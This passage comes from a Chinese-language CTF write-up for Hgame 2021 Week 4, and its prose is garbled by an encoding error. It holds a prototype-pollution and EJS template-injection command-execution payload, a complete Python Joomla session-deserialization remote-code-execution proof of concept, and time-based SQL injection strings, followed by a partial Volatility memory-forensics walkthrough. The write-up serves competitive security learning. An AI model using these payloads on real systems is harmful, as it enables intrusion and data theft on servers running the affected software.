<code>application/x-www-form-urlencoded</code> ä¼ å‚ã€‚</p><p>ä½†æ˜¯ä¸ºäº†æ„é€ åŸå‹é“¾æ±¡æŸ“ï¼Œæˆ‘ä»¬éœ€è¦ç”¨ objectï¼Œå¾ˆå¥½å®ƒåœ¨ç¬¬ 9 è¡Œè¿™é‡Œç”¨äº† <code>json</code>ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æ”¹ä¸€ä¸‹ content-type æ±¡æŸ“äº†ã€‚</p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210221173656117.png"></p><p>payload:</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"meow"</span><span class="token punctuation">,</span> <span class="token property">"discription"</span><span class="token operator">:</span> <span class="token string">"MiaoTony"</span><span class="token punctuation">,</span> <span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"crying"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210221174250281.png" alt="payload"></p><p>ç„¶åè®¿é—® <code>/wish</code> å°±èƒ½å‘ç°æ­£å¸¸è®¿é—®è€Œæ²¡è¢«æ‹¦äº†ã€‚</p><p>åœ¨è¿™é‡Œå°±æ˜¯ <strong>ejs æ¨¡æ¿æ³¨å…¥</strong> å•¦ã€‚</p><p>å‚è€ƒ <a href="https://miaotony.xyz/2020/11/23/CTF_2020NJUPTCTF/#JS-world">ä¹‹å‰ NCTF 2020</a> çš„ payload. å—¯æ˜¯ä¸ªé€šç”¨çš„ payloadã€‚</p><pre class="language-ejs" data-language="ejs"><code class="language-ejs"><span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%-</span><span class="token language-javascript"> global<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'ls -al /'</span><span class="token punctuation">)</span> </span><span class="token delimiter punctuation">%&gt;</span></span></code></pre><p>æ‰“è¿‡å»ï¼Œå…ˆçœ‹çœ‹æ ¹ç›®å½•æœ‰å•¥ã€‚</p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210221174529673.png"></p><p>å¾ˆå¥½ï¼Œçœ‹åˆ° flag äº†ã€‚</p><p>å†èµ°ä¸€éæµç¨‹è¯» flagã€‚</p><pre class="language-ejs" data-language="ejs"><code class="language-ejs"><span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%-</span><span class="token language-javascript"> global<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span> </span><span class="token delimiter punctuation">%&gt;</span></span></code></pre><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210221174649455.png"></p><p><code>hgame{nOdeJs_Prot0type_ls_fUnny&amp;Ejs_Templ@te_Injection}</code></p><h3 id="joomlaJoomla"><a href="#joomlaJoomla" class="headerlink" title="joomlaJoomla!!!!!"></a>joomlaJoomla!!!!!</h3><blockquote><p>è¿™æ˜¯ä¸€ä¸ªç®€å•çš„é¢˜ç›®æè¿°ã€‚é™„ä»¶ï¼š<a href="http://1.oss.hgame2021.vidar.club/joomlaJoomla.zip">http://1.oss.hgame2021.vidar.club/joomlaJoomla.zip</a></p><p><a href="http://9bf30fbbcb.joomla.r4u.top:6788/">http://9bf30fbbcb.joomla.r4u.top:6788/</a> </p></blockquote><p>å•Š 2015 å¹´å·¨å¤è€çš„æ¡†æ¶äº†ã€‚</p><p>ä¸€æœå°±å‘ç°æœ‰ Session ååºåˆ—åŒ–æ¼æ´ã€‚</p><p><a href="https://www.cnblogs.com/xiaozhiru/p/12486989.html">é€šè¿‡Joomlaçš„ä¸¤æ¬¡RCEæ¼æ´çœ‹sessionååºåˆ—åŒ–</a></p><p><a href="https://www.anquanke.com/post/id/83120">sessionååºåˆ—åŒ–ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ[Joomla RCE]</a></p><p>BTW, <a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md">PHP Session åºåˆ—åŒ–åŠååºåˆ—åŒ–å¤„ç†å™¨è®¾ç½®ä½¿ç”¨ä¸å½“å¸¦æ¥çš„å®‰å…¨éšæ‚£</a></p><p>æˆ–è€… ç”¨ searchsploit æœä¸€ä¸‹ä¹Ÿèƒ½å‘ç°ã€‚</p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226043745645.png"></p><p>å°±æ˜¯ Joomla è‡ªå·±å®ç°äº†ä¸€ç§ session åºåˆ—åŒ–çš„æ ¼å¼ï¼Œé€šè¿‡ XFF æˆ–è€… User-Agent å¯ä»¥æ³¨å…¥åˆ°æ•°æ®åº“ã€‚</p><p>ç„¶è€Œç”¨ç°æˆçš„ exp ç›´æ¥æ‰“è¿‡å»å‘ç°æ‰“ä¸é€šã€‚</p><p>çœ‹æ–‡ä»¶ä¿®æ”¹æ—¥æœŸå°±èƒ½å‘ç°æ”¹äº†ä»£ç ã€‚</p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226042806386.png"></p><p>æ ¹æ® <a href="https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html">Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰</a></p><p>å¯¹æ¯”å‘ç°å¢åŠ äº†ä¸€éƒ¨åˆ†ä»£ç ã€‚</p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226043020174.png"></p><p><strong>å¯ä»¥å‘ç°æŠŠç¬¬ä¸€ä¸ªå‡ºç°çš„ <code>|</code> ç»™æ›¿æ¢ä¸ºç©ºäº†ã€‚</strong></p><p>é‚£æˆ‘ä»¬åœ¨ exp æœ€å¼€å§‹åŠ ä¸ª <code>|</code>ï¼Œæˆ–è€…åŒå†™ <code>|</code> å°±å®Œäº‹äº†ï¼</p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226043523338.png"></p><p>ç„¶åç”Ÿæˆ payloadï¼Œæ‹¿ flagã€‚</p><p><strong><em>Python 2</em></strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''   Simple PoC for Joomla Object Injection.   Gary @ Sec-1 ltd   http://www.sec-1.com/'''</span> <span class="token keyword">import</span> requests <span class="token comment">#  easy_install requests</span> <span class="token keyword">def</span> <span class="token function">get_url</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> user_agent<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> user_agent    <span class="token punctuation">}</span>    cookies <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>cookies    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>        <span class="token keyword">return</span> response   <span class="token keyword">def</span> <span class="token function">php_str_noquotes</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token string">"Convert string to chr(xx).chr(xx) for use in php"</span>    encoded <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> data<span class="token punctuation">:</span>        encoded <span class="token operator">+=</span> <span class="token string">"chr({0})."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> encoded<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token keyword">def</span> <span class="token function">generate_payload</span><span class="token punctuation">(</span>php_payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    php_payload <span class="token operator">=</span> <span class="token string">"eval({0})"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>php_str_noquotes<span class="token punctuation">(</span>php_payload<span class="token punctuation">)</span><span class="token punctuation">)</span>    terminate <span class="token operator">=</span> <span class="token string">'\xf0\xfd\xfd\xfd'</span>    exploit_template <span class="token operator">=</span> <span class="token triple-quoted-string string">r'''|}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''</span>    injected_payload <span class="token operator">=</span> <span class="token string">"{};JFactory::getConfig();exit"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>php_payload<span class="token punctuation">)</span>        exploit_template <span class="token operator">+=</span> <span class="token triple-quoted-string string">r'''s:{0}:"{1}"'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>injected_payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> injected_payload<span class="token punctuation">)</span>    exploit_template <span class="token operator">+=</span> <span class="token triple-quoted-string string">r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}'''</span> <span class="token operator">+</span> terminate    <span class="token keyword">return</span> exploit_template  pl <span class="token operator">=</span> generate_payload<span class="token punctuation">(</span><span class="token string">"system('cat /flag');"</span><span class="token punctuation">)</span>  <span class="token comment"># phpinfo();</span><span class="token keyword">print</span> get_url<span class="token punctuation">(</span><span class="token string">"http://9bf30fbbcb.joomla.r4u.top:6788/"</span><span class="token punctuation">,</span> pl<span class="token punctuation">)</span><span class="token punctuation">.</span>content</code></pre><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226043627353.png" alt="æ ¹ç›®å½•"></p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226043603378.png" alt="flag"></p><p><code>hgame{WelCoME~TO-ThIs_Re4Lw0RLD}</code></p><h3 id="Unforgettable"><a href="#Unforgettable" class="headerlink" title="Unforgettable"></a>Unforgettable</h3><blockquote><p>Liki æ›´æ–°äº†å¥¹çš„ TodoList, ç»ˆäºè®°ä½äº†å¾ˆå¤šä¸èƒ½å¿˜è®°çš„äº‹æƒ…<br>PS: flag å†…å®¹ä¸­çš„å­—æ¯éƒ½ä¸ºå°å†™ï¼Œè¯·è‡ªè¡Œç”¨ hgame{} åŒ…è£¹å¾—åˆ°çš„ flag</p><p><a href="https://unforgettable.liki.link/">https://unforgettable.liki.link/</a> </p></blockquote><p>è¿™é¢˜å¾ˆå‘ï¼Œä¸æƒ³ä¸Šå‘¨é‚£æ ·å­˜åœ¨ Flask SSTI.</p><p>è¯•äº†å¾ˆä¹…ï¼Œçªç„¶å‘ç°ç›¸æ¯”ä¸Šå‘¨å¤šäº†ä¸€ä¸ª user é¡µé¢ï¼Œå‘ç°è¿™ä¸ªé¡µé¢ä¸Šçš„ <code>username</code> å­˜åœ¨ SQL æ³¨å…¥ã€‚</p><p>è€Œå…¶ä»–é¡µé¢çš„å³ä¸Šè§’ username éƒ½æ˜¯æ­£å¸¸æ˜¾ç¤ºçš„ï¼ˆç”¨æˆ·ååŸæœ¬çš„æ¨¡æ ·ï¼‰ã€‚</p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210224180641791.png"></p><p>è¿™ä¸ªå†™èµ·æ¥å°±å¾ˆéº»çƒ¦ï¼Œéœ€è¦æ³¨å†Œç”¨æˆ·ï¼Œç„¶åç™»å½•ï¼Œè®¿é—® <code>/user</code>.</p><p>è¯•äº†ä¸€ä¸‹ username è¿‡æ»¤çš„è¿˜æŒºå¤šâ€¦â€¦åŒ…æ‹¬ä½†ä¸é™äº ç©ºæ ¼ <code>=</code> <code>like</code> <code>and</code> <code>or</code> ä¹‹ç±»çš„ã€‚</p><p>è¿˜æœ‰ä¸€å®šæƒ…å†µæ³¨å†ŒæˆåŠŸäº†ä½†è®¿é—® <code>/user</code> å¹¶æ²¡æœ‰å›æ˜¾ï¼Œåè€Œå°±æ˜¯ä¸ª <code>username</code>ã€‚</p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210224165814297.png"></p><p>åæ¥æ‰çŸ¥é“è¿™æ˜¯ <strong>SQL äºŒæ¬¡æ³¨å…¥</strong>ã€‚</p><blockquote><p><em>äºŒæ¬¡æ³¨å…¥</em>æ˜¯æŒ‡å·²å­˜å‚¨(æ•°æ®åº“ã€æ–‡ä»¶)çš„ç”¨æˆ·è¾“å…¥è¢«è¯»å–åå†æ¬¡è¿›å…¥åˆ° <em>SQL</em> æŸ¥è¯¢è¯­å¥ä¸­å¯¼è‡´çš„æ³¨å…¥</p></blockquote><p>è¿™é¢˜ä¸­å°±æ˜¯ åœ¨ user é¡µé¢æœ‰ä¸ª SQL è¯­å¥ï¼Œè®¿é—®çš„æ—¶å€™æ‰æ‰§è¡ŒæŸ¥è¯¢ï¼Œä½†å°±èƒ½æ³¨å…¥äº†ã€‚</p><p>çè¯•äº†è¯•å‘ç°è¿˜æŠŠåˆ«äººçš„ç”¨æˆ·åç»™æ•´å‡ºæ¥äº†ã€‚2333</p><p>å•Šå‘ç°æœ‰ç°æˆçš„ payload äº†ã€‚å¥½è€¶ï¼</p><pre class="language-none"><code class="language-none">SeleCt'+'1+21HinrG'/**/&amp;&amp;/**/(IF(right(left((SELECT/**/GROUP_CONCAT(ffllllaaaagg)/**/FROM/**/ffflllaagggg),1),1)/**/IN/**/('''),BENCHMARK(55555555,MD5('a')),0))#</code></pre><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210224180202149.png"></p><pre class="language-none"><code class="language-none">SeleCt'+'55dPaU6'/**/&amp;&amp;/**/(IF(LENGTH((SELECT/**/ffllllaaaagg/**/FROM/**/ffflllaagggg))/**/IN/**/(2),BENCHMARK(55555555,MD5('a')),0))#</code></pre><p>å…¶å®å°±ç›²æ³¨ï¼Œå¸ƒå°”/æ—¶é—´ç›²æ³¨éƒ½è¡Œã€‚</p><p>è¦æ³¨å†Œç™»å½•æŒºéº»çƒ¦çš„å°±æ˜¯äº†ã€‚</p><p><em>ï¼ˆä¸è¿‡åæ¥å¯’å‡ä¹ˆå¾—äº† æ²¡ç©ºå†™è„šæœ¬äº† emmm</em></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Akiraä¹‹ç³-1"><a href="#Akiraä¹‹ç³-1" class="headerlink" title="Akiraä¹‹ç³-1"></a>Akiraä¹‹ç³-1</h3><blockquote><p>æœ‰äººæƒ³é—® Akira ä¸ºä»€ä¹ˆæ€»å–œæ¬¢ç”¨çœ¼ç›å½“å¤´åƒï¼ŒAkira è¯´ï¼šâ€œæˆ‘ç»™ä½ è®²ä¸ªæ•…äº‹å§ï¼Œä»å‰æœ‰ä¸€å¤©ä¸€ä½åŸç”»å¸ˆåœ¨ä¸Šç­ï¼Œä¸å¹¸çš„æ˜¯çªç„¶èµ·äº†ç«ç¾ï¼Œæƒ…æ€¥ä¹‹ä¸‹ IT éƒ¨é—¨æŠŠå¥¹æ²¡ä¿å­˜çš„å·¥ä½œ dump äº†ä¸‹æ¥å¹¶ä¼ åˆ°äº†ç½‘ä¸Š â€¦â€¦ â€</p><p><a href="https://1.oss.hgame2021.vidar.club/important_work_bf81f2db20bfa2045a4cd2f6e6214544.7z">https://1.oss.hgame2021.vidar.club/important_work_bf81f2db20bfa2045a4cd2f6e6214544.7z</a> </p></blockquote><p><strong>å†…å­˜å–è¯</strong></p><p>1GiB çš„å†…å­˜é•œåƒå•Šï¼Œå¥½å¤§ï¼ˆ</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ volatility -f important_work.raw imageinfoVolatility Foundation Volatility Framework <span class="token number">2.6</span>INFO    <span class="token builtin class-name">:</span> volatility.debug    <span class="token builtin class-name">:</span> Determining profile based on KDBG search<span class="token punctuation">..</span>.          Suggested Profile<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token builtin class-name">:</span> Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418                     AS Layer1 <span class="token builtin class-name">:</span> WindowsAMD64PagedMemory <span class="token punctuation">(</span>Kernel AS<span class="token punctuation">)</span>                     AS Layer2 <span class="token builtin class-name">:</span> FileAddressSpace <span class="token punctuation">(</span>E:<span class="token punctuation">\</span>CTF<span class="token punctuation">\</span>test<span class="token punctuation">\</span>Hgame2021<span class="token punctuation">\</span>week4<span class="token punctuation">\</span>Misc_Akira-1<span class="token punctuation">\</span>important_work.raw<span class="token punctuation">)</span>                      PAE <span class="token builtin class-name">type</span> <span class="token builtin class-name">:</span> No PAE                           DTB <span class="token builtin class-name">:</span> 0x187000L                          KDBG <span class="token builtin class-name">:</span> 0xf8000403b0a0L          Number of Processors <span class="token builtin class-name">:</span> <span class="token number">16</span>     Image Type <span class="token punctuation">(</span>Service Pack<span class="token punctuation">)</span> <span class="token builtin class-name">:</span> <span class="token number">1</span>                KPCR <span class="token keyword">for</span> CPU <span class="token number">0</span> <span class="token builtin class-name">:</span> 0xfffff8000403cd00L                KPCR <span class="token keyword">for</span> CPU <span class="token number">1</span> <span class="token builtin class-name">:</span> 0xfffff88004700000L                KPCR <span class="token keyword">for</span> CPU <span class="token number">2</span> <span class="token builtin class-name">:</span> 0xfffff88004776000L                KPCR <span class="token keyword">for</span> CPU <span class="token number">3</span> <span class="token builtin class-name">:</span> 0xfffff880047ec000L                KPCR <span class="token keyword">for</span> CPU <span class="token number">4</span> <span class="token builtin class-name">:</span> 0xfffff88004840000L                KPCR <span class="token keyword">for</span> CPU <span class="token number">5</span> <span class="token builtin class-name">:</span> 0xfffff880048b6000L                KPCR <span class="token keyword">for</span> CPU <span class="token number">6</span> <span class="token builtin class-name">:</span> 0xfffff8800492c000L                KPCR <span class="token keyword">for</span> CPU <span class="token number">7</span> <span class="token builtin class-name">:</span> 0xfffff880049a2000L                KPCR <span class="token keyword">for</span> CPU <span class="token number">8</span> <span class="token builtin class-name">:</span> 0xfffff880049d8000L                KPCR <span class="token keyword">for</span> CPU <span class="token number">9</span> <span class="token builtin class-name">:</span> 0xfffff88004a94000L               KPCR <span class="token keyword">for</span> CPU <span class="token number">10</span> <span class="token builtin class-name">:</span> 0xfffff88004b0a000L               KPCR <span class="token keyword">for</span> CPU <span class="token number">11</span> <span class="token builtin class-name">:</span> 0xfffff88004b80000L               KPCR <span class="token keyword">for</span> CPU <span class="token number">12</span> <span class="token builtin class-name">:</span> 0xfffff88004c00000L               KPCR <span class="token keyword">for</span> CPU <span class="token number">13</span> <span class="token builtin class-name">:</span> 0xfffff88004c76000L               KPCR <span class="token keyword">for</span> CPU <span class="token number">14</span> <span class="token builtin class-name">:</span> 0xfffff88004cec000L               KPCR <span class="token keyword">for</span> CPU <span class="token number">15</span> <span class="token builtin class-name">:</span> 0xfffff88004d62000L             KUSER_SHARED_DATA <span class="token builtin class-name">:</span> 0xfffff78000000000L           Image <span class="token function">date</span> and <span class="token function">time</span> <span class="token builtin class-name">:</span> <span class="token number">2021</span>-02-18 09:47:25 UTC+0000     Image <span class="token builtin class-name">local</span> <span class="token function">date</span> and <span class="token function">time</span> <span class="token builtin class-name">:</span> <span class="token number">2021</span>-02-18 <span class="token number">17</span>:47:25 +0800</code></pre><p>Win7SP1x64 </p><p>çœ‹çœ‹æ¡Œé¢ä¸Šæœ‰å•¥æ–‡ä»¶ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ volatility -f important_work.raw --profile<span class="token operator">=</span>Win7SP1x64 filescan <span class="token operator">|</span> <span class="token function">grep</span> DesktopVolatility Foundation Volatility Framework <span class="token number">2.6</span>0x000000001ed735f0      <span class="token number">5</span>      <span class="token number">0</span> R--r-d <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>DumpIt.exe0x000000003ec31eb0     <span class="token number">10</span>      <span class="token number">0</span> R--r-d <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>DumpIt.exe0x000000003ec5c070      <span class="token number">1</span>      <span class="token number">1</span> RW-rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>HGAME2021-20210218-094722.raw0x000000003ec703d0     <span class="token number">18</span>      <span class="token number">2</span> R--rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>work.zip0x000000003ed28eb0     <span class="token number">10</span>      <span class="token number">0</span> R--r-d <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>DumpIt.exe0x000000003ed53070      <span class="token number">1</span>      <span class="token number">1</span> RW-rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>HGAME2021-20210218-094722.raw0x000000003ed673d0     <span class="token number">18</span>      <span class="token number">2</span> R--rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>work.zip0x000000003f277bb0     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>desktop.ini0x000000003f278a40      <span class="token number">2</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Public<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>desktop.ini0x000000003f27a8c0      <span class="token number">2</span>      <span class="token number">1</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Public<span class="token punctuation">\</span>Desktop0x000000003f27aa90      <span class="token number">2</span>      <span class="token number">1</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Public<span class="token punctuation">\</span>Desktop0x000000003f287dd0      <span class="token number">2</span>      <span class="token number">1</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop0x000000003f288c40      <span class="token number">2</span>      <span class="token number">1</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop0x000000003f28edd0     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>Desktop.ini0x000000003f28f440     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>Accessibility<span class="token punctuation">\</span>Desktop.ini0x000000003f2906d0     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Maintenance<span class="token punctuation">\</span>Desktop.ini0x000000003f293070     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>System Tools<span class="token punctuation">\</span>Desktop.ini0x000000003f294600     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Games<span class="token punctuation">\</span>Desktop.ini0x000000003f294a60     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>Desktop.ini0x000000003f296ac0     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Maintenance<span class="token punctuation">\</span>Desktop.ini0x000000003f297370     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>Accessibility<span class="token punctuation">\</span>Desktop.ini0x000000003f297f20     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>System Tools<span class="token punctuation">\</span>Desktop.ini0x000000003f299c10     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>Tablet PC<span class="token punctuation">\</span>Desktop.ini0x000000003f2e1a40      <span class="token number">6</span>      <span class="token number">0</span> R--r-d <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>important_work.exe0x000000003f2fa710      <span class="token number">1</span>      <span class="token number">1</span> R--rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span 